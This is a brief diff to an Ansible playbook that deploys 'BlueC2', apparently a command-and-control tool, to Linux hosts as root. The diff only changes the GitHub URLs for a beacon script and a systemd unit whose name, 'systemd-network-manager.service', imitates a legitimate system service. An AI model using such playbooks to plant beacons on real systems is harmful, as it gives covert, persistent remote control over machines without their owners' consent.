@@ -1,8 +1,8 @@
 - name: BlueC2 Deploy
   hosts: linux
   vars:
-    beacon_url: "https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/beacon.py"
-    service_url: "https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/systemd-network-manager.service"
+    beacon_url: "https://raw.githubusercontent.com/bcvillano/BlueC2Client/beacon.py"
+    service_url: "https://raw.githubusercontent.com/bcvillano/BlueC2Client/systemd-network-manager.service"
   become: yes
   tasks:
 
